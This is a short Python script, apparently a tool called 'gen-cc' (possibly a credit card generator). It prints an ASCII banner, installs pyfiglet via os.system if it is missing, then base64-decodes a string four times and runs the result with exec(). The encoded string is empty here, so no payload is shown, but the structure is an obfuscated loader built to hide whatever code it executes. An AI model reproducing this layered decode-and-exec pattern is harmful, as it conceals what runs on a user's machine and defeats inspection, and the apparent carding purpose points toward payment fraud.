import base64
try:
 import pyfiglet
 from pyfiglet import Figlet
except:
 import os
 os.system('pip3 install pyfiglet')
fonts = Figlet(font="slant")
print(fonts.renderText('gen-cc'))
code = ""
shell = base64.b64decode(code)
shell2 = base64.b64decode(shell)
shell3 = base64.b64decode(shell2)
shell4 = base64.b64decode(shell3)
exec(shell4)
